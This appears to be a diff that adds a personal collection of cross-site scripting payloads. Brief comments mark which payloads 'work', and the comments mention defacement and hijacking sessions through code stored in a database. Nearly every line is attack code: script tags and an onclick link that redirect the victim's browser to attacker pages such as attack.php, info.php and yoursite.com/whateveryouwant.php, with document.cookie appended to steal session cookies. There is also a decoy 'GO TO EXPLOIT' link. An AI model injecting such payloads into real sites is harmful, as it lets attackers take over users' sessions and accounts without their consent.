@@ -1,0 +1,42 @@
+// JavaScript Document
+<script type="text/javascript">
+alert(document.cookie);
+</script>
+
+// running in loop 
+><script type= "text/javascript">document.location="http://localhost/xss/attack/attack.php?cookie=" + document.cookie;document.location="http://localhost/css/attack/info.php"</script>
+
+// testing 
+><script type= "text/javascript">document.location="http://localhost/xss/attack/attack.php?cookie=" + document.location="http://localhost/css/attack/info.php"</script>
+
+// working as defacement
+<script type= "text/javascript">document.location="http://localhost/xss/attack/attack.php?cookie=" + document.cookie;document.location="http://localhost/css/attack/info.php"</script>
+
+
+
+// not researched yet
+"><a href="#" onclick="document.location='http://yoursite.com/whateveryouwant.php?cookie=' +escape(document.cookie);"><Click Me></a></script>
+
+// JavaScript Document
+<script type="text/javascript">
+alert(document.cookie);
+</script>
+
+<meta http-equiv="Content-Type" refresh="0" content="text/html; charset=UTF-8" />
+
+// directly go to the exploiter.php
+<script type= "text/javascript">document.location="http://localhost/xss/attack/info.php?cookie=" + document.cookie;document.location="http://localhost/css/attack/attack.php?q" + document.cookie</script>
+
+// working with attack.php and directly go to the attack.php
+<script type= "text/javascript">document.location="http://localhost/css/attack/attack.php"</script> 
+
+
+// working with attacker.php to get the session directly if this code is injected in the database
+<script type= "text/javascript">document.location="http://localhost/xss/attack/info.php?cookie=" + document.cookie;document.location="http://localhost/css/attack/attacker.php?" + document.cookie</script>
+
+
+// working with  attack.php and exploit.php, the victim first click the "GO TO EXPLOIT" and must click the hyperlink named as // "Go" in the exploit.php
+<a href="http://localhost/css/attack/exploiter.php" style="text-decoration:none;"><h2 align="center">GO TO EXPLOIT</h2></a>
+
+
+
